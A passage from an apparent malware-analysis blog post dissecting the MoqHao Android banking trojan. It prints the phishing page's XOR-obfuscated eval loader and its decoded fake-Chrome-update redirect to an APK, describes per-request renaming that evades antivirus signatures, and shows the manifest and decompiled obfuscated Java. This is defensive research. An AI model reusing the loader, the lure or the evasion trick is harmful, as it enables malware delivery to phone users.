class="s2">&#34;14964,14969,14960,14951,14945,14909,14903,14932,14963,14972,14971,14901,14961,14898,14964,14947,14970,14972,14951,14901,14944,14971,14960,14901,14968,14960,14972,14969,14969,14960,14944,14951,14960,14901,14960,14957,14949,15100,14951,14972,14960,14971,14966,14960,14905,14901,14947,14960,14944,14972,14969,14969,14960,14959,14901,14968,14960,14945,14945,14951,14960,14901,15093,14901,14975,14970,14944,14951,14901,14947,14970,14945,14951,14960,14901,14971,14964,14947,14972,14962,14964,14945,14960,14944,14951,14901,14934,14973,14951,14970,14968,14960,14901,15093,14901,14969,14964,14901,14961,14960,14951,14971,14972,15101,14951,14960,14901,14947,14960,14951,14950,14972,14970,14971,14903,14908,14894,14879,14901,14901,14901,14901,14901,14901,14901,14901,14969,14970,14966,14964,14945,14972,14970,14971,14907,14951,14960,14949,14969,14964,14966,14960,14909,14903,14906,14973,14957,14961,14950,14947,14962,14956,14960,14972,14946,14907,14964,14949,14974,14903,14908,14894,14869&#34;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">){</span><span class="k">return</span> <span class="nx">a</span><span class="o">|</span><span class="mi">0</span><span class="p">});</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span><span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">^</span><span class="nx">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">arr</span><span class="p">.</span><span class="nx">pop</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nb">eval</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(...</span><span class="nx">arr</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can simply replace the <code>eval</code> function with a <code>console.log</code> and executes it to get the following <em>clean</em> JS code.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;Afin d&#39;avoir une meilleure expÃ©rience, veuillez mettre Ã  jour votre navigateur Chrome Ã  la derniÃ¨re version&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&#34;/hxdsvgyeiw.apk&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This code opens a popup which says &ldquo;For a better experience, please update your Chrome browser to the latest version&rdquo;.
Then redirects you to the android malware (<code>/hxdsvgyeiw.apk</code>).</p>
<p>The name of the APK changes every time you request the website. The resource folder name and the resource name of the malware is also changed every time to bypass hash/string detection signature by AV.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sha256sum samples/*apk
</span></span><span class="line"><span class="cl">d18cbb0dc2321ef6ed05fea165afb19f2b23b651906ecfe3fe594f47377daa23  samples/rosolhvtig.apk
</span></span><span class="line"><span class="cl">7da86d30b325db5989f44a500c25df9bf76fcb94eae2bee26c8a851d47094b8e  samples/ykvfcdselh.apk
</span></span></code></pre></td></tr></table>
</div>
</div><p>You can check <code>rosolhvtig.apk</code> on VirusTotal, <a class="link" href="https://www.virustotal.com/gui/file/d18cbb0dc2321ef6ed05fea165afb19f2b23b651906ecfe3fe594f47377daa23?nocache=1"  target="_blank" rel="noopener"
    >link</a>.</p>
<h2 id="malware-analysis">Malware analysis
</h2><p>Here is the list of tools I used in this analysis with their purpose :</p>
<ul>
<li><strong>jadx-gui</strong> (Java/DEX decompiler)</li>
<li><strong>Ghidra</strong> (Native library disassembler/decompiler)</li>
<li><strong>AVD</strong> (Run and manage Android VMs)</li>
<li><strong>Frida</strong> (Hooks functions inside Android app)</li>
<li><strong>Burpsuite</strong> (HTTP proxy)</li>
</ul>
<h3 id="overview-of-the-application">Overview of the application
</h3><p>We can use <code>jadx-gui</code> to view the source code of the malware.</p>
<p><img src="/img/moqhao-malware-analysis/apk_structure.png"
	
	
	
	loading="lazy"
	
		alt="APK File structure"
	
	
></p>
<p>Before diving into the code, we can notice two things in the file structure. We have a native library (<code>libvg.so</code>) and a resource with a weird name (<code>1eqlsfh</code>). Let&rsquo;s check the entropy (randomness of data) of the resource on <a class="link" href="https://cyberchef.org/#recipe=Entropy%28%27Shannon%20scale%27%29"  target="_blank" rel="noopener"
    >CyberChef</a>.</p>
<p><img src="/img/moqhao-malware-analysis/entropy.png"
	
	
	
	loading="lazy"
	
		alt="Entropy of the resource"
	
	
></p>
<p>We get <code>7.99</code> as entropy, this means that the resource is encrypted and/or compressed. We can keep that in mind for later.</p>
<p>In the <code>AndroidManifest.xml</code>, we can extract the permissions and the name of the MainActivity.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;manifest</span> <span class="na">xmlns:android=</span><span class="s">&#34;http://schemas.android.com/apk/res/android&#34;</span> <span class="na">android:versionCode=</span><span class="s">&#34;11&#34;</span> <span class="na">android:versionName=</span><span class="s">&#34;96&#34;</span> <span class="na">android:compileSdkVersion=</span><span class="s">&#34;23&#34;</span> <span class="na">android:compileSdkVersionCodename=</span><span class="s">&#34;6.0-2438415&#34;</span> <span class="na">package=</span><span class="s">&#34;fzicp.hmoj.zqzf.cnuxf&#34;</span> <span class="na">platformBuildVersionCode=</span><span class="s">&#34;23&#34;</span> <span class="na">platformBuildVersionName=</span><span class="s">&#34;6.0-2438415&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-sdk</span> <span class="na">android:minSdkVersion=</span><span class="s">&#34;18&#34;</span> <span class="na">android:targetSdkVersion=</span><span class="s">&#34;21&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.ACCESS_WIFI_STATE&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.CHANGE_NETWORK_STATE&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.CALL_PHONE&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.WRITE_EXTERNAL_STORAGE&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.READ_EXTERNAL_STORAGE&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.ACCESS_NETWORK_STATE&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.MODIFY_AUDIO_SETTINGS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.RECEIVE_BOOT_COMPLETED&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;yytp.hytm.bzkzk&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;anjccte.cepa.jnch&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.WAKE_LOCK&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.INTERNET&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.RECEIVE_SMS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.READ_SMS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.SEND_SMS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.SYSTEM_ALERT_WINDOW&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.READ_CONTACTS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.READ_PHONE_STATE&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.GET_ACCOUNTS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;application</span> <span class="na">android:label=</span><span class="s">&#34;ChÐ³ome&#34;</span> <span class="na">android:icon=</span><span class="s">&#34;@drawable/ic_launcher&#34;</span> <span class="na">android:name=</span><span class="s">&#34;gb9i3m6.RgApplication&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;activity</span> <span class="na">android:theme=</span><span class="s">&#34;@android:style/Theme.Translucent.NoTitleBar.Fullscreen&#34;</span> <span class="na">android:name=</span><span class="s">&#34;gb9i3m6.YrActivity&#34;</span> <span class="na">android:exported=</span><span class="s">&#34;true&#34;</span> <span class="na">android:excludeFromRecents=</span><span class="s">&#34;true&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;intent-filter&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.action.MAIN&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.category.LAUNCHER&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/intent-filter&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/activity&gt;</span>
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><p>Of course, the malware requires a large number of permissions, we can already make assumptions about the potential functionality of the malware.</p>
<p>Here is the code of the MainActivity (<code>gb9i3m6.YrActivity</code>) :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">gb9i3m6</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">android.app.Activity</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">android.content.Context</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">android.os.Bundle</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">s.ni</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">YrActivity</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">Activity</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">a</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str2</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">z</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">z2</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ni</span><span class="p">.</span><span class="na">qc</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">str2</span><span class="p">,</span><span class="w"> </span><span class="n">1L</span><span class="p">,</span><span class="w"> </span><span class="n">str3</span><span class="p">,</span><span class="w"> </span><span class="n">3</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">b</span><span class="p">(</span><span class="n">Context</span><span class="w"> </span><span class="n">context</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ni</span><span class="p">.</span><span class="na">pe</span><span class="p">(</span><span class="n">context</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w"> </span><span class="c1">// android.app.Activity</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onCreate</span><span class="p">(</span><span class="n">Bundle</span><span class="w"> </span><span class="n">bundle</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">.</span><span class="na">onCreate</span><span class="p">(</span><span class="n">bundle</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Ud</span><span class="p">.</span><span class="na">c</span><span class="p">(</span><span class="k">this</span><span class="p">);</span><span class="w"> </span><span class="c1">// Create Ud instance from static function, then create new RgApplication</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">objArr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[</span><span class="n">2</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="p">(</span><span class="k">this</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">objArr</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="p">(</span><span class="n">getPackageName</span><span class="p">(),</span><span class="w"> </span><span class="n">YrActivity</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">(),</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;0&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">objArr</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">unused</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ni</span><span class="p">.</span><span class="na">jf</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">objArr</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="n">0L</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="n">1L</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">finish</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, the code is obfuscated and we have a lot of <strong>native library calls</strong>. All the calls are described here :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">s</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ni</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">iz</span><span class="p">(</span><span class="n">Class</span><span class="w"> </span><span class="n">cls</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">jf</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">objArr</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">j</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i2</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">z</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i3</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">z2</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">j2</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">z3</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">ls</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">mz</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str2</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">z</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">oa</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">z</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">ob</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">obj2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">om</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">op</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">obj2</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">obj3</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">j</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">z</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">oq</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">z</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
